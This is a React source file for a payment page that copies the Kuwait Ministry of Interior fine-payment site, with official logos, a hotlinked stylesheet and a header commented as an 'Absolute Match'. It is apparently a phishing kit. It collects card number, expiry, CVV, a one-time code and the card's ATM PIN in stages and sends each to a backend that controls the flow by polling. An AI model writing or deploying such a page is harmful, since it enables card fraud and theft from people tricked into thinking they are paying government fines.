import React, { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  
  const { lang } = useLanguage();

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      setLocation("/");
      return;
    }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: parsed.enquiryType,
      queryId: parsed.queryId
    });
  }, []);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => {
      setSessionId(data.sessionId);
    }
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { 
      enabled: !!sessionId && (stage.endsWith("_pending")),
      refetchInterval: 2000 
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) {
        setError(sessionStatus.errorMessage);
      }
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const submitPin = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: cardName || "Customer",
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: expiry,
      cardCvv: cvv
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({
      sessionId,
      otpCode: otp
    });
  };

  const handlePinSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitPin.mutate({
      sessionId,
      atmPin: pin
    });
  };

  if (!paymentData) return null;

  return (
    <div className="moi-original-payment" dir="rtl">
      {/* Official CSS Files */}
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <link rel="stylesheet" href="https://www.moi.gov.kw/main/css/site.css?v=go_4IccMhw1NChPOSH_W7AbpThLoN7-zMHFe4trNRE0" />
      
      <style>{`
        body { background-color: rgb(236, 234, 228) !important; font-family: "Droid Arabic Kufi Regular", Arial, sans-serif !important; }
        .moi-original-payment { background-color: rgb(236, 234, 228); min-height: 100vh; }
        .container { background-color: #fff; box-shadow: 0 0 15px rgba(0,0,0,0.1); padding: 0 !important; max-width: 1140px; }
        .navbar { background-color: #000576 !important; border-bottom: none !important; }
        .content-main { background-color: rgb(236, 234, 228); padding: 30px 20px; }
        .article-info { background: #fff; padding: 25px; border: 1px solid #ddd; }
        .footer-moi { background-color: #000576 !important; color: #fff !important; padding: 20px 0; }
        .payment-card-ui { max-width: 500px; margin: 0 auto; border: 1px solid #ddd; background: #fff; border-radius: 8px; overflow: hidden; }
        .payment-header { background: #f8f9fa; padding: 15px; border-bottom: 1px solid #eee; text-align: center; font-weight: bold; color: #000576; }
        .btn-moi { background-color: #000576 !important; color: #fff !important; border-radius: 4px; padding: 10px; font-weight: bold; }
      `}</style>

      <div className="container">
        {/* Header - Absolute Match */}
        <header className="px-3 py-2">
          <div className="row align-items-center no-gutters">
            <div className="col-4 col-md-2 text-center">
              <a href="/">
                <img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" style={{ height: "120px" }} alt="MOI Logo" />
              </a>
            </div>
            <div className="col-8 col-md-10 d-flex flex-column align-items-end justify-content-center pr-md-5">
              <img src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" style={{ height: "40px" }} alt="State of Kuwait" />
              <img src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" className="mt-1" style={{ height: "35px" }} alt="Ministry of Interior" />
            </div>
          </div>
        </header>

        <nav className="navbar navbar-expand-lg navbar-dark py-2">
          <div className="container">
            <ul className="navbar-nav w-100 pr-0">
              <li className="nav-item"><a className="nav-link" href="/">الرئيسيــة</a></li>
              <li className="nav-item active"><a className="nav-link" href="#">دفع المخالفات</a></li>
            </ul>
          </div>
        </nav>

        <div className="content-main">
          <div className="text-center mb-4">
            <h4 style={{ color: "#000576", fontWeight: "bold" }}>استكمال عملية الدفع</h4>
            <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" className="img-fluid" alt="divider" />
          </div>

          <div className="payment-card-ui shadow-sm">
            <div className="payment-header">بوابة الدفع الإلكتروني</div>
            <div className="p-4">
              <div className="alert alert-secondary text-right mb-4">
                <div className="small">المبلغ الإجمالي</div>
                <div className="h4 font-weight-bold m-0 text-danger">{paymentData.totalAmount} د.ك</div>
              </div>

              {stage === "card" && (
                <form onSubmit={handleCardSubmit} className="text-right">
                  <div className="form-group">
                    <label className="small font-weight-bold">اسم حامل البطاقة</label>
                    <input type="text" className="form-control" value={cardName} onChange={e => setCardName(e.target.value)} required />
                  </div>
                  <div className="form-group">
                    <label className="small font-weight-bold">رقم البطاقة</label>
                    <input type="text" className="form-control text-left" dir="ltr" value={cardNumber} onChange={e => setCardNumber(e.target.value)} placeholder="**** **** **** ****" required />
                  </div>
                  <div className="row">
                    <div className="col-6">
                      <div className="form-group">
                        <label className="small font-weight-bold">تاريخ الانتهاء</label>
                        <input type="text" className="form-control text-center" placeholder="MM/YY" value={expiry} onChange={e => setExpiry(e.target.value)} required />
                      </div>
                    </div>
                    <div className="col-6">
                      <div className="form-group">
                        <label className="small font-weight-bold">CVV</label>
                        <input type="password" className="form-control text-center" placeholder="***" value={cvv} onChange={e => setCvv(e.target.value)} required />
                      </div>
                    </div>
                  </div>
                  <button type="submit" className="btn btn-moi btn-block mt-3" disabled={submitCard.isPending}>
                    {submitCard.isPending ? "جاري المعالجة..." : "تأكيد الدفع"}
                  </button>
                </form>
              )}

              {stage === "otp" && (
                <form onSubmit={handleOtpSubmit} className="text-center">
                  <h6 className="font-weight-bold mb-3">أدخل رمز التحقق (OTP)</h6>
                  <p className="small text-muted">تم إرسال رمز التحقق إلى هاتفك المسجل</p>
                  <input type="text" className="form-control form-control-lg text-center mb-3" style={{ letterSpacing: '0.3em' }} value={otp} onChange={e => setOtp(e.target.value)} maxLength={6} required />
                  <button type="submit" className="btn btn-moi btn-block">تأكيد الرمز</button>
                </form>
              )}

              {stage === "atm" && (
                <form onSubmit={handlePinSubmit} className="text-center">
                  <h6 className="font-weight-bold mb-3">أدخل الرقم السري للبطاقة (PIN)</h6>
                  <input type="password" className="form-control form-control-lg text-center mb-3" style={{ letterSpacing: '0.3em' }} value={pin} onChange={e => setPin(e.target.value)} maxLength={4} required />
                  <button type="submit" className="btn btn-moi btn-block">تأكيد الرقم السري</button>
                </form>
              )}

              {(stage.endsWith("_pending")) && (
                <div className="text-center py-4">
                  <div className="spinner-border text-primary mb-3"></div>
                  <p className="m-0">جاري معالجة طلبك، يرجى الانتظار...</p>
                </div>
              )}

              {stage === "success" && (
                <div className="text-center py-4">
                  <div className="h1 text-success mb-3">✓</div>
                  <h5 className="font-weight-bold text-success">تمت عملية الدفع بنجاح</h5>
                  <p className="small text-muted">تم استلام المبلغ وتحديث سجلاتك</p>
                  <button className="btn btn-outline-primary mt-3" onClick={() => setLocation("/")}>العودة للرئيسية</button>
                </div>
              )}

              {stage === "failed" && (
                <div className="text-center py-4">
                  <div className="h1 text-danger mb-3">✕</div>
                  <h5 className="font-weight-bold text-danger">فشلت عملية الدفع</h5>
                  <p className="small text-muted">{error || "حدث خطأ غير متوقع"}</p>
                  <button className="btn btn-moi mt-3" onClick={() => setStage("card")}>حاول مرة أخرى</button>
                </div>
              )}
            </div>
          </div>
        </div>

        <footer className="footer-moi text-center">
          <div className="container">
            <div className="small">© جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2026</div>
          </div>
        </footer>
      </div>
    </div>
  );
}
